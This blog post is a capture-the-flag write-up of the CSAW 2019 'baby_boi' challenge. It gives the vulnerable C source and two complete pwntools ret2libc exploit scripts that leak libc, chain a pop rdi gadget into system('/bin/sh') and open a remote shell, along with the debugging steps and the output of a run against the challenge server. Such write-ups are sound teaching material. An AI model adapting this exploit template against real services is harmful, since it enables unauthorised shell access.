---
layout: post
title:  "CSAW Qualifiers 2019: baby_boi"
date:   2019-09-16 04:00:00 +0800
categories: pwn
tags: CSAW-Qualifiers-2019
---

This binary had a very simple stack buffer overflow with NX enabled. It required a ret2libc attack, however calling `system` once didn't work because of the condition the stack was in, so I had to add more input into the payload to create a valid stack frame. More information in the writeup.

### Challenge

* **Category:** pwn
* **Points:** 50
* **Solves:** ~300

>Welcome to pwn.
>
>nc pwn.chal.csaw.io 1005

### Solution

We are given the following source code for the binary:
```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv[]) {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  char buf[32];
  printf("Hello!\n");
  printf("Here I am: %p\n", printf);
  gets(buf);
}
```

If you are unfamiliar with how a ret2libc exploit works, I suggest reading up my writeup of [Storytime from HSCTF-6](/pwn/2019/06/23/hsctf-binary-exploitation-challenges.html#storytime).

For this challenge specifically, when running the program, we get given `printf`'s libc address which we can easily use to calculate the address of `system` and the string `/bin/sh` in libc. The following exploit is what I used initially:
```python
#!/usr/bin/env python2

from pwn import *

BINARY = './baby_boi'
HOST, PORT = 'pwn.chal.csaw.io', 1005
context.terminal = ['tmux', 'new-window']

elf = ELF(BINARY)
libc = ELF('./libc-2.27.so')

def start():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

def debug(bps):
    gdbscript = ''

    for bp in bps:
        gdbscript += 'b *0x{:x}'.format(bp)

    gdb.attach(p, gdbscript=gdbscript)

p = start()
if not args.REMOTE and args.GDB:
    debug([0x40072e]) # ret in main

p.recvuntil(': ')

printf_leak = int(p.recvuntil('\n')[:-1], 16)

log.info('printf at: ' + hex(printf_leak))

libc.address = printf_leak - libc.symbols['printf']

log.info('libc base: ' + hex(libc.address))

system = libc.symbols['system']
bin_sh = next(libc.search('/bin/sh'))
pop_rdi = libc.address + 0x2155f

log.info('system: ' + hex(system))
log.info('/bin/sh: ' + hex(bin_sh))
log.info('pop rdi: ' + hex(pop_rdi))

payload = 'A'*40
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

p.sendline(payload)

p.interactive()
```

It simply runs the program, takes the address of `printf` given to it, calculates offsets to `system` and `/bin/sh`, then calls `system('/bin/sh')`. The `pop rdi` gadget address was found by running `ROPgadget --binary ./libc-2.27.so | grep "pop rdi"`.

However, initially running this exploit resulted in a segfault. I couldn't figure out why, so I spun up my Ubuntu Bionic VM to replicate the conditions of the remote binary (I knew to use Bionic because the libc version given to us was 2.27, which comes pre-installed with Bionic). Running the exploit locally then also resulted in a segfault.

I ran the binary with `tmux` and `./exploit.py GDB` to step through it with GDB. I set a breakpoint on the `ret` instruction from main (refer to my script for further details), and I realized that it was seg faulting in the call to `system`. GDB specifically said that the seg fault happened in `do_system+679`, which has the instruction `mov rcx, [rsp+0x178]`, so I restarted the exploit, and after hitting the breakpoint at the end of main, I did a `b *do_system+679` to set a breakpoint on that instruction.

Continuing on from there, the breakpoint at `do_system+679` was hit, and I inspected the stack at `rsp+0x178` by doing `x/gx $rsp+0x178` and found that the stack value was an invalid address. That's why it was segfaulting. `[rsp+0x178]` will dereference that invalid address resulting in a segfault.

The way I solved the challenge then was to append some valid addresses to my payload. Remember that the payload is put on the stack, so chances are if we keep adding valid addresses to the payload, one of those addresses will overwrite this address on the stack and prevent the segfault. I just ended up calling `system('/bin/sh')` twice, as seen in my final payload below. Appending any valid address to the stack would have been fine though.
```python
#!/usr/bin/env python2

from pwn import *

BINARY = './baby_boi'
HOST, PORT = 'pwn.chal.csaw.io', 1005
context.terminal = ['tmux', 'new-window']

elf = ELF(BINARY)
libc = ELF('./libc-2.27.so')

def start():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

def debug(bps):
    gdbscript = ''

    for bp in bps:
        gdbscript += 'b *0x{:x}'.format(bp)

    gdb.attach(p, gdbscript=gdbscript)

p = start()
if not args.REMOTE and args.GDB:
    debug([0x40072e]) # ret in main

p.recvuntil(': ')

printf_leak = int(p.recvuntil('\n')[:-1], 16)

log.info('printf at: ' + hex(printf_leak))

libc.address = printf_leak - libc.symbols['printf']

log.info('libc base: ' + hex(libc.address))

system = libc.symbols['system']
bin_sh = next(libc.search('/bin/sh'))
pop_rdi = libc.address + 0x2155f

log.info('system: ' + hex(system))
log.info('/bin/sh: ' + hex(bin_sh))
log.info('pop rdi: ' + hex(pop_rdi))

payload = 'A'*40
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

p.sendline(payload)

p.interactive()
```

```sh
vagrant@ubuntu-bionic:/ctf/pwn-and-rev/csaw-2019-quals/pwn/baby_boi$ ./exploit.py REMOTE
[*] '/ctf/pwn-and-rev/csaw-2019-quals/pwn/baby_boi/baby_boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/ctf/pwn-and-rev/csaw-2019-quals/pwn/baby_boi/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwn.chal.csaw.io on port 1005: Done
[*] printf at: 0x7f10fe591e80
[*] libc base: 0x7f10fe52d000
[*] system: 0x7f10fe57c440
[*] /bin/sh: 0x7f10fe6e0e9a
[*] pop rdi: 0x7f10fe54e55f
[*] Switching to interactive mode
$ ls
baby_boi
flag.txt
$ cat flag.txt
flag{baby_boi_dodooo_doo_doo_dooo}
$  
```

Flag: `flag{baby_boi_dodooo_doo_doo_dooo}`
